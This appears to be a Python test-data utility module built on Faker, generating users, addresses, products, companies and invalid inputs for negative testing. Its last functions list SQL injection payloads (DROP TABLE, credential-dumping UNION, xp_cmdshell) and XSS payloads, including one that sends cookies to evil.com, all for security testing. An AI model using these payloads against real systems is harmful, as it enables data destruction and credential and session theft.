"""
Test Data Generation Utilities

This module provides Faker-based test data generators for creating realistic, non-hardcoded
test data across the test automation framework. It includes generators for common entities
(users, addresses, products, organizations) as well as invalid data generators for negative
testing scenarios.

Usage:
    # Generate realistic user data
    user = generate_user_data(role="admin", email="custom@example.com")
    
    # Generate unique email for parallel test isolation
    email = generate_unique_email(domain="test.local")
    
    # Generate deterministic data for reproducible tests
    set_seed(12345)
    user = generate_user_data()  # Always same data for this seed
    
Important Note:
    While these generators provide realistic data patterns, actual test data should be
    created through the MCP server per framework directive. These generators are useful for:
    1. Providing data to MCP build_payload calls
    2. Generating test data within MCP server implementation
    3. Creating realistic payloads when MCP server is unavailable (local dev only)
"""

import time
from typing import Dict, Any, List, Optional
from faker import Faker

# Initialize global Faker instance
fake = Faker()


def generate_user_data(role: str = "customer", **overrides: Any) -> Dict[str, Any]:
    """
    Generate realistic user data with optional field overrides.
    
    This function creates a complete user profile with all common fields including
    personal information, contact details, and address. Field values can be overridden
    for test-specific requirements.
    
    Args:
        role: User role/type (e.g., "customer", "admin", "manager")
        **overrides: Dictionary of field overrides to customize generated data
        
    Returns:
        Dictionary containing complete user profile data
        
    Example:
        >>> user = generate_user_data(role="admin", email="admin@test.com")
        >>> assert user["role"] == "admin"
        >>> assert user["email"] == "admin@test.com"
        >>> assert "first_name" in user
    """
    user_data = {
        "email": fake.email(),
        "name": fake.name(),
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "username": fake.user_name(),
        "password": fake.password(
            length=12,
            special_chars=True,
            digits=True,
            upper_case=True,
            lower_case=True
        ),
        "phone": fake.phone_number(),
        "date_of_birth": fake.date_of_birth(minimum_age=18, maximum_age=80).isoformat(),
        "role": role,
        "address": generate_address_data()
    }
    # Apply any field overrides
    user_data.update(overrides)
    return user_data


def generate_unique_email(domain: str = "test.local") -> str:
    """
    Generate unique email with timestamp to avoid conflicts in parallel test execution.
    
    This function creates email addresses with millisecond-precision timestamps and
    random numbers to ensure uniqueness across concurrent test runs. Essential for
    parallel test execution where email uniqueness constraints exist.
    
    Args:
        domain: Email domain suffix (default: "test.local")
        
    Returns:
        Unique email address string in format: user_{timestamp}_{random}@{domain}
        
    Example:
        >>> email1 = generate_unique_email()
        >>> email2 = generate_unique_email()
        >>> assert email1 != email2  # Guaranteed unique
        >>> assert email1.endswith("@test.local")
    """
    timestamp = int(time.time() * 1000)
    # Use larger random range (100000-999999) to minimize collision probability
    # even when generating many emails within the same millisecond
    random_suffix = fake.random_int(100000, 999999)
    return f"user_{timestamp}_{random_suffix}@{domain}"


def generate_address_data(country: str = "US") -> Dict[str, str]:
    """
    Generate realistic address data for specified country.
    
    Creates locale-specific address information matching the formatting and
    conventions of the specified country. Currently supports US addresses with
    extensibility for additional countries.
    
    Args:
        country: ISO country code (default: "US")
        
    Returns:
        Dictionary containing address components (street, city, state, zip, country)
        
    Example:
        >>> address = generate_address_data(country="US")
        >>> assert "street" in address
        >>> assert address["country"] == "US"
        >>> assert len(address["state"]) == 2  # US state abbreviation
    """
    if country == "US":
        return {
            "street": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip_code": fake.zipcode(),
            "country": "US"
        }
    elif country == "UK":
        # Use UK-specific Faker locale for county and postcode
        fake_uk = Faker('en_GB')
        return {
            "street": fake_uk.street_address(),
            "city": fake_uk.city(),
            "state": fake_uk.county(),
            "zip_code": fake_uk.postcode(),
            "country": "UK"
        }
    elif country == "CA":
        # Use CA-specific Faker locale for province and postal code
        fake_ca = Faker('en_CA')
        return {
            "street": fake_ca.street_address(),
            "city": fake_ca.city(),
            "state": fake_ca.province_abbr(),
            "zip_code": fake_ca.postcode(),
            "country": "CA"
        }
    else:
        # Generic international address format
        return {
            "street": fake.street_address(),
            "city": fake.city(),
            "state": fake.word().capitalize(),
            "zip_code": fake.bothify(text="###-####"),
            "country": country
        }


def generate_coordinates() -> Dict[str, float]:
    """
    Generate latitude/longitude coordinates for location-based testing.
    
    Creates valid geographic coordinates useful for testing location features,
    mapping functionality, or geospatial queries.
    
    Returns:
        Dictionary with "latitude" and "longitude" as float values
        
    Example:
        >>> coords = generate_coordinates()
        >>> assert -90 <= coords["latitude"] <= 90
        >>> assert -180 <= coords["longitude"] <= 180
    """
    return {
        "latitude": float(fake.latitude()),
        "longitude": float(fake.longitude())
    }


def generate_product_data(**overrides: Any) -> Dict[str, Any]:
    """
    Generate product/item data for e-commerce or inventory testing.
    
    Creates realistic product information including name, description, pricing,
    and categorization. Useful for testing shopping carts, inventory systems,
    or product catalogs.
    
    Args:
        **overrides: Dictionary of field overrides to customize generated data
        
    Returns:
        Dictionary containing product data (name, description, price, sku, category)
        
    Example:
        >>> product = generate_product_data(price=99.99, category="Electronics")
        >>> assert product["price"] == 99.99
        >>> assert product["category"] == "Electronics"
        >>> assert "sku" in product
    """
    product_data = {
        "name": fake.catch_phrase(),
        "description": fake.text(max_nb_chars=200),
        "price": round(fake.random.uniform(10.0, 500.0), 2),
        "sku": fake.bothify(text="SKU-########"),
        "category": fake.word().capitalize(),
        "in_stock": fake.random_element([True, False]),
        "quantity": fake.random_int(0, 1000)
    }
    product_data.update(overrides)
    return product_data


def generate_company_data(**overrides: Any) -> Dict[str, Any]:
    """
    Generate organization/company data for B2B or enterprise testing.
    
    Creates realistic company profiles including business information, contact
    details, and web presence. Useful for testing CRM systems, B2B platforms,
    or organizational management features.
    
    Args:
        **overrides: Dictionary of field overrides to customize generated data
        
    Returns:
        Dictionary containing company data (name, email, phone, website, industry)
        
    Example:
        >>> company = generate_company_data(name="Acme Corp", industry="Technology")
        >>> assert company["name"] == "Acme Corp"
        >>> assert company["industry"] == "Technology"
        >>> assert "@" in company["email"]
    """
    company_data = {
        "name": fake.company(),
        "email": fake.company_email(),
        "phone": fake.phone_number(),
        "website": fake.url(),
        "industry": fake.bs().title(),
        "employees": fake.random_int(10, 10000),
        "founded_year": fake.random_int(1950, 2023)
    }
    company_data.update(overrides)
    return company_data


def generate_invalid_email() -> str:
    """
    Generate intentionally invalid email formats for negative testing.
    
    Returns various malformed email addresses to test email validation logic,
    error handling, and input sanitization. Essential for security and
    robustness testing.
    
    Returns:
        String containing an invalid email pattern
        
    Example:
        >>> invalid_email = generate_invalid_email()
        >>> # Should fail email validation
        >>> assert "@" not in invalid_email or invalid_email.startswith("@")
    """
    invalid_patterns = [
        "not_an_email",
        "@example.com",
        "user@",
        "user @example.com",
        "user@.com",
        "user@example",
        "user..name@example.com",
        "user@exam ple.com",
        "user@@example.com",
        ".user@example.com",
        "user.@example.com",
        "user@example..com"
    ]
    return fake.random_element(invalid_patterns)


def generate_invalid_phone() -> str:
    """
    Generate invalid phone number formats for negative testing.
    
    Creates malformed phone numbers to test phone validation, error handling,
    and data sanitization. Returns various invalid patterns including too short,
    too long, or improperly formatted numbers.
    
    Returns:
        String containing an invalid phone number
        
    Example:
        >>> invalid_phone = generate_invalid_phone()
        >>> # Should fail phone validation
        >>> assert len(invalid_phone.replace("-", "")) < 10 or "abc" in invalid_phone
    """
    invalid_patterns = [
        "123-456",  # Too short
        "abc-defg-hijk",  # Letters instead of numbers
        "00000000000",  # All zeros
        "1234567890123456789",  # Too long
        "+++123456789",  # Invalid special characters
        "",  # Empty string
        "phone",  # Plain text
        "123 456",  # Incomplete
    ]
    return fake.random_element(invalid_patterns)


def generate_sql_injection_strings() -> List[str]:
    """
    Generate common SQL injection payloads for security testing.
    
    Returns a list of SQL injection attack patterns to test database query
    security, input sanitization, and parameterized query implementation.
    Critical for security testing and vulnerability assessment.
    
    Returns:
        List of SQL injection payload strings
        
    Example:
        >>> payloads = generate_sql_injection_strings()
        >>> assert len(payloads) > 0
        >>> assert any("DROP TABLE" in payload for payload in payloads)
    """
    return [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' OR '1'='1' /*",
        "' OR 1=1--",
        "admin' OR '1'='1",
        "' OR 'a'='a",
        "1'; DELETE FROM users WHERE '1'='1",
        "' UNION SELECT username, password FROM users--",
        "1' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' WAITFOR DELAY '00:00:05'--",
        "'; EXEC xp_cmdshell('dir')--",
        "' OR '1'='1' LIMIT 1--"
    ]


def generate_xss_strings() -> List[str]:
    """
    Generate XSS (Cross-Site Scripting) payloads for security testing.
    
    Returns a list of XSS attack patterns to test output encoding, HTML
    sanitization, and Content Security Policy implementation. Essential
    for web application security testing.
    
    Returns:
        List of XSS payload strings
        
    Example:
        >>> payloads = generate_xss_strings()
        >>> assert len(payloads) > 0
        >>> assert any("<script>" in payload for payload in payloads)
    """
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "<img src='x' onerror='eval(atob(\"YWxlcnQoJ1hTUycp\"))'>"
    ]


def set_seed(seed: int) -> None:
    """
    Set Faker seed for reproducible data generation across test runs.
    
    Configures the Faker instance to generate deterministic data based on the
    provided seed value. Essential for debugging flaky tests or creating
    reproducible test scenarios.
    
    Args:
        seed: Integer seed value for deterministic generation
        
    Example:
        >>> set_seed(12345)
        >>> email1 = fake.email()
        >>> set_seed(12345)
        >>> email2 = fake.email()
        >>> assert email1 == email2  # Same seed produces same data
    """
    Faker.seed(seed)


def generate_seeded_user(seed: int) -> Dict[str, Any]:
    """
    Generate user data with specific seed for test reproducibility.
    
    Creates a complete user profile using a specific seed value, ensuring the
    same user data is generated every time for the same seed. Useful for
    debugging specific test scenarios or maintaining consistent test fixtures.
    
    Args:
        seed: Integer seed value for deterministic generation
        
    Returns:
        Dictionary containing complete user profile data
        
    Example:
        >>> user1 = generate_seeded_user(12345)
        >>> user2 = generate_seeded_user(12345)
        >>> assert user1["email"] == user2["email"]
        >>> assert user1["name"] == user2["name"]
    """
    Faker.seed(seed)
    return generate_user_data()
